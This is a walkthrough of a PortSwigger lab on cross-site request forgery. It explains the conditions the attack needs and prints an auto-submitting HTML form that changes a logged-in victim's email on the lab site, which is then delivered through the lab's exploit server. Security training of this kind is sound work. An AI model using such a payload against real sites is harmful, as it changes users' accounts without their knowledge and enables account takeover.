# Lab1: CSRF vulnerability with no defenses


We start by logging into the application using the credentials provided. This gives us access to the account settings, including the email change form.

<img width="1019" height="364" alt="image" src="https://github.com/user-attachments/assets/73b110c1-0b8b-408c-8982-ffede49317fb" />

For a CSRF attack to work, three conditions must be met:
1. 	Relevant Action
• 	The target action must change something — like updating an email, deleting a user, or transferring money.
• 	In this lab, the action is changing the email address — ✅ relevant.
2. 	No Unpredictable Parameters
• 	The request must not include random tokens (like CSRF tokens or nonces) that the attacker can’t guess.
• 	The email change form uses a simple  parameter — ✅ predictable.
3. 	Cookie-Based Authentication
• 	The site uses cookies for session management, and the browser sends them automatically.
• 	No extra headers or tokens are required — ✅ cookie-based.
✅ All three conditions are satisfied — we’re good to go.

<img width="1039" height="746" alt="image" src="https://github.com/user-attachments/assets/f5b74619-1ca4-4a5d-997d-9131eea83e91" />

We try changing the email manually to see the request format. It’s a simple POST request to: `/my-account/change-email`
With a body like:`email=zaaaaaaa@a.a`

Since we don’t have Burp Suite Pro, we use an online CSRF PoC generator. After a few tweaks, we get a working payload:

<img width="1388" height="530" alt="image" src="https://github.com/user-attachments/assets/fa5282e0-e281-4a94-8d33-2b7c95739528" />

```
<!doctype html>
<html>
  <head><meta charset="utf-8"><title>CSRF PoC</title></head>
  <body>
    <form id="f" action="https://<LAB-ID>.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="zaaaaaaa@a.a">
    </form>
    <script>
      document.getElementById('f').submit();
    </script>
  </body>
</html>
```
We paste the malicious HTML into the exploit server provided by PortSwigger. Click “Store” to save it, then “Deliver exploit to victim.”
If the victim is logged in, their browser will send the request — and the email will be updated without their knowledge.

<img width="1044" height="681" alt="image" src="https://github.com/user-attachments/assets/e54606cd-a748-4b80-8377-d6b2e8ae8897" />

The victim’s email is changed. No CSRF tokens. No protection. Just pure browser-side trickery.

<img width="1003" height="375" alt="image" src="https://github.com/user-attachments/assets/733fdd96-1067-4a19-949d-11f43980df3b" />

